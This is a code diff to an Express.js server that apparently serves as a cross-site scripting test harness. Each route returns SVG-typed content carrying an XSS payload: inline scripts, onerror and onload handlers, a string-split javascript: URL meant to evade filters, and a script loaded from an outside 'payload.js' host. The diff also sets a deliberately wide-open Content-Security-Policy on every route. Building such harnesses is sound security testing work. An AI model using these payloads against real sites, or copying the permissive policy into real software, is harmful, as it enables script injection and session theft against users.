@@ -33,23 +33,25 @@ app.use((req, res, next) => {
 app.get('/image0.svg', (req, res) => {
   // Serve JavaScript instead of an image
   res.setHeader('Content-Type', 'image/svg+xml');
-  res.send(`<svg xmlns="http://www.w3.org/2000/svg">
-  <h1>hi there</h1>
-  </svg>
-  <script>
-    alert("This is a script in an SVG!");
-  </script>
-  <img src=x onerror=alert(1) />
-  <script>
-    alert("This is a script in an SVG!");
-  />
-  
-</svg>`);
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send(`
+  <svg xmlns="http://www.w3.org/2000/svg">
+      <h1>hi there</h1>
+      </svg>
+      <script>
+        alert("This is a script in an SVG!");
+      </script>
+      <img src=x onerror=alert(1) />
+      <script>
+        alert("This is a script in an SVG!");
+      />
+  </svg>`);
 });
 
 app.get('/image1.svg', (req, res) => {
   // Serve JavaScript instead of an image
   res.setHeader('Content-Type', 'image/svg+xml');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
   res.send(`<svg xmlns="http://www.w3.org/2000/svg">
   
   
@@ -64,12 +66,14 @@ app.get('/image1.svg', (req, res) => {
 app.get('/image2.svg', (req, res) => {
   // Serve JavaScript instead of an image
   res.setHeader('Content-Type', 'image/svg+xml');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
   res.send(`<object type="image/svg+xml" data="https://kani-collaborator.onrender.com/image1.svg"></object>`);
 });
 
 app.get('/image3.svg', (req, res) => {
   // Serve JavaScript instead of an image
   res.setHeader('Content-Type', 'image/svg+xml');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
   res.send(`<svg xmlns="http://www.w3.org/2000/svg" onclick="alert('SVG clicked!')">
   <rect width="100" height="100" fill="red"></rect>
 </svg>`);
@@ -78,9 +82,40 @@ app.get('/image3.svg', (req, res) => {
 app.get('/image4.svg', (req, res) => {
   // Serve JavaScript instead of an image
   res.setHeader('Content-Type', 'image/svg+xml');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
   res.send(`<svg xmlns="http://www.w3.org/2000/svg" >
   <script src="alertwebsite.ct.ws/payload.js" />
 </svg>`);
+});
+
+app.get('/image_onload_att.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send(`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
+  <circle cx="50" cy="50" r="40" />
+</svg>`);
+});
+
+app.get('/image_escape.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send("<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//");
+});
+
+app.get('/image-IMG-tag.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send("<img src=x onerror=alert(1) />");
+});
+
+app.get('/image-a-tag.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send("<a href=javascript:alert(1) onerror=alert(1) >hi</a>");
 });
 
 
